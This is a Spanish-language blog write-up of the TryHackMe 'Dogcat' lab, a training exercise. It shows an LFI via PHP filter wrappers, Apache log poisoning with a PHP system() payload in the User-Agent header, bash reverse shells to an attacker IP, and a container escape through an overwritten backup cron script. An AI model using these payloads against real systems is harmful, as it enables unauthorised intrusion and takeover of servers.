---
layout: single
title: Dogcat - TryHackMe
excerpt: "(Difficulty: Medium) A website where you can look at pictures of dogs and/or cats! Exploit a PHP application via LFI and break out of a docker container."
date: 2023-02-23
classes: wide
header:
  teaser: /blog/assets/images/thm-writeup-dogcat/dogcat.png
  teaser_home_page: true
  icon: /blog/assets/images/tryhackme.webp
categories:
  - tryhackme
tags:
  - LFI
  - Wrappers
  - Log Poisoning
  - Apache
  - Docker
  - PHP
---

(Difficulty: Medium) A website where you can look at pictures of dogs and/or cats! Exploit a PHP application via LFI and break out of a docker container.

# Summary
- IP: 10.10.7.140
- Ports: 22,80
- OS: Linux (Ubuntu)
- Services & Applications:
	-  22 -> OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
	-  80 -> Apache httpd 2.4.38

# Recon

- Escaneo básico de puertos:

```bash
$nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 10.10.7.140 -oG allPorts
```


- Escaneo profundo de puertos encontrados:

```bash
$nmap -p21,22,80 -sCV 10.10.7.140 -oN targeted
```

- Escaneo de directorios con Gobuster:

gobuster dir -u 10.10.7.140 -w /home/dante/SecLists/Discovery/Web-Content/common.txt -t 30

```js
/cats                 (Status: 301) [Size: 309] [--> http://10.10.7.140/cats/]
/cat.php              (Status: 200) [Size: 26]                                
/flag.php             (Status: 200) [Size: 0]                                 
/index.php            (Status: 200) [Size: 418]                               
/index.php            (Status: 200) [Size: 418]                               
/server-status        (Status: 403) [Size: 276]   
```

# Análisis de página web (Port 80):

- En la web principal vemos texto y dos botones, uno con el contenido "A cat" y el otro con "A dog", si presionamos en uno, por ejemplo en el primero, nos muestra la imagen de un gato, si volvemos a presionar nos muestra una imagen diferente, lo mismo sucede si precionamos "A dog", mostrándonos imágenes de perros en lugar de gatos.

- Si analizamos el link, vemos que se usa un parámetro `"view"` el cual se supone que debería apuntar hacia un archivo local del sistema, en este caso, si presionamos en "A cat" apunta a "cat", lo cual resulta sospechoso ya que no vemos la extensión del archivo, así que probamos modificando la petición GET editando el link y apuntar a un archivo cualquiera, en este caso a "/etc/passwd" lo cual nos arroja el texto `"Sorry, only dogs or cats are allowed."`

# LFI y Análisis de código PHP:

- Seguimos haciendo pruebas modificando el link. en este caso, probamos apuntando a "cat23" y nos arroja el siguiente error de `PHP`:

```
Warning: include(cat23.php): failed to open stream: No such file or directory in /var/www/html/index.php on line 24

Warning: include(): Failed opening 'cat23.php' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/index.php on line 24
```

- Lo cual nos confirma que sí está incluyendo archivos del sistema, solo que con algunas condiciones; Solo se aceptan las peticiones GET que contengan el string "dog" o "cat" y además PHP por detrás está agregando la extensión ".php" al archivo apuntado, en este caso, como se envían "dog y "cat" al presionar en los botones de la página principal podemos deducir que existen los archivos "dog.php" y "cat.php" los cuales contendrán el respectivo código que hace que se muestre una imagen al azar al presionar el correspondiente botón.

- La deducción anterior la podemos confirmar revisando los archivos que enumeramos en la fase de reconocimiento al hacer un escaneo de directorios, vemos que sí que existe un archivo "cat.php" pero al acceder a este no nos permite visualizar su contenido, lo normal.

- Como ya sabemos que existe un `LFI`, podemos adecuarlo para obtener información interesante, en este caso, podríamos leer lo que hay por detrás de cada archivo PHP haciendo uso de wrappers:

```
http://10.10.7.140/?view=php://filter/convert.base64-encode/resource=./cat/../index
```

	- Usamos el wrapper "php://filter/convert.base64-encode/resource=" para obtener el contenido del archivo al que apuntamos en base64
	- Apuntamos al archivo "./cat/../index" para cumplir la condición de que se envíe la palabra "cat" por GET y el index lo dejamos sin extensión porque PHP por detrás la agrega automáticamente; aplicamos un PATH traversal para adecuar el haber incluido la palabra "cat".


- Obtenemos el contenido de `"index.php"` en base64, lo decodeamos:

```bash
$echo -n "contenido en base64" | base64 -d; echo
```

```php
<!DOCTYPE HTML>
<html>

<head>
    <title>dogcat</title>
    <link rel="stylesheet" type="text/css" href="/style.css">
</head>

<body>
    <h1>dogcat</h1>
    <i>a gallery of various dogs or cats</i>

    <div>
        <h2>What would you like to see?</h2>
        <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
        <?php
            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
	    $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
            if(isset($_GET['view'])) {
                if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
                    echo 'Here you go!';
                    include $_GET['view'] . $ext;
                } else {
                    echo 'Sorry, only dogs or cats are allowed.';
                }
            }
        ?>
    </div>
</body>

</html>
```

- Aquí podemos ver todo lo que ya habíamos sospechado, específicamente en el siguiente bloque:

```php
<?php
            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
	    $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
            if(isset($_GET['view'])) {
                if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
                    echo 'Here you go!';
                    include $_GET['view'] . $ext;
                } else {
                    echo 'Sorry, only dogs or cats are allowed.';
                }
            }
?>
```

#### Análisis del código:

- Primero se define una función llamada `"containsStr"` que devuelve verdadero si una cadena contiene una subcadena y falso en caso contrario.

- Luego, declara una variable `$ext` que verifica si se ha pasado una cadena `ext` en la URL utilizando la variable `$_GET`. Si se ha pasado "ext", $ext toma ese valor, de lo contrario, toma el valor predeterminado ".php".

- Después, comprueba si la variable ```$_GET['view']``` existe (si se ha seleccionado un botón) y si la selección del usuario es "dog" o "cat" utilizando la función "containsStr". Si la selección es válida, el código imprime "Here you go!" y utiliza la función "include" para agregar el archivo correspondiente a la selección del usuario con la extensión definida en la variable "$ext". De lo contrario, se imprime el mensaje de error "Sorry, only dogs or cats are allowed."


# Retomando el LFI:

- Como vemos que el valor de "ext" es el que agrega la extensión ".php" al final de nuestra petición solo si no se le da un valor, podemos aprovecharnos de esto simplemente dándole un valor nulo, por ejemplo:

```
http://10.10.7.140/?view=/cat/../etc/passwd&ext
```

- Como podremos observar, efectivamente la página nos devuelve el contenido del archivo "/etc/passwd", así que seguimos enumerando posibles vulnerabilidades para derivar el `LFI` a `RCE`.

- Buscamos el archivo de logs `Apache`:

```
http://10.10.7.140/?view=/cat/../var/log/apache2/access.log&ext
```

- Sí que podemos ver el contenido de logs Apache, lo cual nos permitirá realizar un ataque de `log poisoning`, para obtener un `RCE`.


# Log Poisoning (Apache):

- Con `Burpsuite` interceptamos cualquier petición GET hacia la máquina víctima y la mandamos al repeater.

- En el campo de `"User-Agent"` inyectamos código PHP malicioso el cual nos lo interpretará al momento de leer el archivo `"access.log"`:

```html
GET / HTTP/1.1
Host: 10.10.7.140
User-Agent: <?php system ($_GET['cmd']); ?>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
```

- Le damos en `SEND` y ya estaría envenenado el archivo de logs Apache, lo que resta por hacer es comprobarlo enviándole con el parámetro "cmd" algún comando:

```
view-source:http://10.10.7.140/?view=/cat/../var/log/apache2/access.log&ext&cmd=ls -l /
```


- Confirmamos el `RCE` y ahora entablamos una reverse shell básica, haciendo su respectivo tratamiento.

```
view-source:http://10.10.7.140/?view=/cat/../var/log/apache2/access.log&ext&cmd=bash -c "bash -i >& /dev/tcp/10.18.101.123/443 0>&1"
```

# ESCALANDO PRIVILEGIOS:

- Habiendo ganado acceso al sistema, haciendo un "hostname -i" nos damos cuenta que la dirección IP no coincide con la que debería tener, por lo que deducimos que estamos dentro de un `contenedor` y no de la máquina real.

- Buscamos formas para escapar del actual contenedor.

- Vemos permisos de `sudoers` y vemos lo siguiente:

```js
www-data@2ad93fca4fbd:/opt/backups$ sudo -l
Matching Defaults entries for www-data on 2ad93fca4fbd:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on 2ad93fca4fbd:
    (root) NOPASSWD: /usr/bin/env
```

- Es decir, podemos ejecutar el binario `"env"` como `root` sin contraseña, esto lo podemos explotar de acuerdo a una simple búsqueda en [GTFOBins](https://gtfobins.github.io/#p) con el siguiente comando:

```bash
$sudo env /bin/bash
```

- Lo ejecutamos y seremos `root`, sin embargo seguimos dentro del contenedor y no de la máquina real, lo cual no mola.

- Si buscamos en el directorio "/opt" vemos un directorio "/backup" el cual contiene dos archivos: "backup.sh" y "backup.tar"

- Cateamos la script:

```bash
$cat backup.sh 
```

```
#!/bin/bash
tar cf /root/container/backup/backup.tar /root/container
```

- Como vemos, lo que hace la script es realizar una copia de seguridad de todo el contenido que se encuentra en "/root/container" en un archivo comprimido "backup.tar" que es justo el que habíamos encontrado en este mismo directorio.

- Como se trata de una copia de seguridad, deducimos que es una `script` que se va a ejecutar indefinididamente en patrones de tiempo determinados, así que, como somos root, modificamos el contenido de la script para que nos mande una reverse shell, ya que por lógica, la que ejecuta esta script es la máquina víctima real (pues está haciendo una copia de seguridad de su contenedor):


```bash
$echo "#! /bin/bash" > backup.sh
$echo "bash -c 'bash -i >& /dev/tcp/10.18.101.123/123 0>&1'" >> backup.sh 
```


- Después de unos minutos en escucha, bbtenemos ahora sí una shell como `root` en la máquina víctima real y podremos leer las `4 flags` que hay en el sistema:

Flag 1: `/var/www/html`
Flag 2: `/var/www`
Flag 3: `/root`  (contenedor)
Flag 4: `/root` (Máquina real)

